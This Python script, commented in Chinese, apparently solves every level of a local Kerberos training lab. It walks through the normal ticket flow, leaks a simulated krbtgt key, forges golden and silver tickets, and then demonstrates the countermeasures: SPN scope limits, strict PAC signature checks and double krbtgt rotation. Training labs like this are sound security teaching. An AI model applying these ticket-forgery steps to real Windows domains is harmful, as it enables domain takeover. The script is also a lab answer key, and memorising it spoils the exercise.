"""
solve.py - 一键通关验证脚本（零第三方依赖）

按「正常流程 → 黄金 → 白银 → 范围限制 → PAC 签名 → 密钥轮换」的顺序，
把上一轮对话里讲到的每一条区别都跑成可复核的证据，并断言六个 flag 全部拿到。
它复用 lab.py 的 HTTP / 票据封印逻辑，等价于把手动命令串起来执行。

运行：python3 poc/solve.py
每步会打印 ok / reason / 解锁的 flag，最后汇总。任何断言失败会以非零码退出。
"""

import os
import sys

import lab

PORTAL = "http/portal.lab.local"
DC_SHARE = "cifs/dc.lab.local"
FILE_SHARE = "cifs/files.lab.local"
FILE_WEB = "http/files.lab.local"

collected = {}


def call(method, path, data=None):
    return lab.http(method, path, data)


def post(path, data=None):
    return call("POST", path, data)


def get(path):
    return call("GET", path)


def wipe_cache():
    for name in ("tgt", "tgs", "keys.json"):
        try:
            os.remove(lab.cache_path(name))
        except OSError:
            pass


def report(title, r, expect_ok=None, expect_reason=None):
    """打印一步结果，收集新解锁的 flag，并在期望不符时立即失败。"""
    for item in r.get("unlocked", []):
        collected[item["level"]] = item["flag"]
    flags = ["L%d %s" % (i["level"], i["flag"]) for i in r.get("unlocked", [])]
    line = "  %-42s ok=%-5s reason=%-18s" % (
        title, str(r.get("ok")), str(r.get("reason", "-")))
    if flags:
        line += "  ->  " + ", ".join(flags)
    print(line)
    if expect_ok is not None and r.get("ok") is not expect_ok:
        fail("期望 ok=%s，实际 %s：%s" % (expect_ok, r.get("ok"), title))
    if expect_reason and r.get("reason") != expect_reason:
        fail("期望 reason=%s，实际 %s：%s" % (expect_reason, r.get("reason"), title))
    return r


def fail(msg):
    print("\n[断言失败] " + msg)
    sys.exit(1)


def ask(tgt, spn, title):
    r = post("/api/tgs", {"tgt": tgt, "spn": spn})
    report(title, r)
    if r.get("ok"):
        lab.save("tgs", r["tgs"])
    return r


def use(spn, title, **expect):
    tgs = lab.load("tgs")
    if not tgs:
        fail("缓存里没有 TGS：" + title)
    return report(title, post("/api/ap", {"tgs": tgs, "spn": spn}), **expect)


def leak_krbtgt():
    r = get("/api/leak/krbtgt")
    keys = lab.load_keys()
    keys["krbtgt"] = r["key"]
    lab.save("keys.json", keys)
    return r["key"]


def leak_service(spn):
    r = get("/api/leak/service?spn=" + spn)
    keys = lab.load_keys()
    keys[spn] = r["key"]
    lab.save("keys.json", keys)
    return r["key"]


def main():
    print("=" * 78)
    print("Kerberos 黄金 / 白银票据靶场 · 一键通关验证")
    print("=" * 78)

    report("重置靶场与本地票据缓存", post("/api/admin/restart"), expect_ok=True)
    wipe_cache()

    print("\n[L1] 正常三段流程：AS -> TGS -> AP")
    r = report("AS-REQ alice", post("/api/as", {"user": "alice", "password": "alice123"}),
               expect_ok=True)
    normal_tgt = r["tgt"]
    lab.save("tgt", normal_tgt)
    ask(normal_tgt, PORTAL, "TGS-REQ 内网门户")
    use(PORTAL, "AP-REQ 内网门户（应成功）", expect_ok=True)

    print("\n[对照] 普通域用户正常申请域控 C$：PAC 里没有 512，应被拒")
    ask(normal_tgt, DC_SHARE, "TGS-REQ 域控 C$")
    use(DC_SHARE, "AP-REQ 域控 C$（应拒绝）", expect_ok=False,
        expect_reason="access_denied")

    print("\n[L2] 黄金票据：DCSync 拿 krbtgt 密钥，离线伪造 10 年期 TGT")
    leak_krbtgt()
    lab.cmd_forge(["golden"])
    golden_tgt = lab.load("tgt")
    ask(golden_tgt, DC_SHARE, "TGS-REQ（KDC 认了伪造 TGT）")
    use(DC_SHARE, "AP-REQ 域控 C$（应成功）", expect_ok=True)

    print("\n[L3] 白银票据：拿机器账户密钥，离线伪造 cifs TGS，全程不碰 DC")
    dc_before = len(get("/api/state")["dc_logs"])
    leak_service(FILE_SHARE)
    lab.cmd_forge(["silver", "--spn", FILE_SHARE])
    use(FILE_SHARE, "AP-REQ 文件服务（应成功）", expect_ok=True)
    dc_after = len(get("/api/state")["dc_logs"])
    print("  域控日志条数：%d -> %d（白银票据未产生任何 DC 事件）" % (dc_before, dc_after))
    if dc_before != dc_after:
        fail("白银票据竟然在 DC 上留下了日志")

    print("\n[L4] 范围限制：把 cifs 白银票据投给 http 服务")
    use(FILE_WEB, "AP-REQ Web 管理（应拒绝）", expect_ok=False,
        expect_reason="spn_mismatch")

    print("\n[L5] 开启完整 PAC 签名校验（对应 KB5020805 强制模式）")
    report("pac on", post("/api/admin/pac", {"strict": True}), expect_ok=True)
    lab.cmd_forge(["silver", "--spn", FILE_SHARE])
    use(FILE_SHARE, "白银票据（KDC 签名伪造，应被拒）", expect_ok=False,
        expect_reason="bad_kdc_signature")
    lab.cmd_forge(["golden"])
    golden_tgt = lab.load("tgt")
    ask(golden_tgt, DC_SHARE, "TGS-REQ（KDC 重新签 PAC）")
    use(DC_SHARE, "黄金票据（PAC 由 KDC 重签，应成功）", expect_ok=True)

    print("\n[L6] krbtgt 轮换：一次不够，两次才让旧黄金票据失效")
    report("第一次重置 krbtgt", post("/api/admin/reset"), expect_ok=True)
    ask(golden_tgt, DC_SHARE, "旧黄金 TGT 仍被接受（历史密钥还在）")
    report("第二次重置 krbtgt", post("/api/admin/reset"), expect_ok=True)
    report("旧黄金 TGT 应校验失败", post("/api/tgs", {"tgt": golden_tgt, "spn": DC_SHARE}),
           expect_ok=False, expect_reason="tgt_invalid")

    print("\n" + "=" * 78)
    state = get("/api/state")
    done = sum(1 for v in state["progress"].values() if v)
    print("通关进度：%d / %d" % (done, state["total_levels"]))
    for n in range(1, state["total_levels"] + 1):
        p = state["progress"][str(n)]
        print("  L%d  %s" % (n, (p["flag"] + "  <- " + p["evidence"]) if p else "未通关"))
    if done != state["total_levels"]:
        fail("有关卡未解锁，请检查上面的 reason")
    print("\n全部断言通过。面板：http://127.0.0.1:8907")


if __name__ == "__main__":
    main()
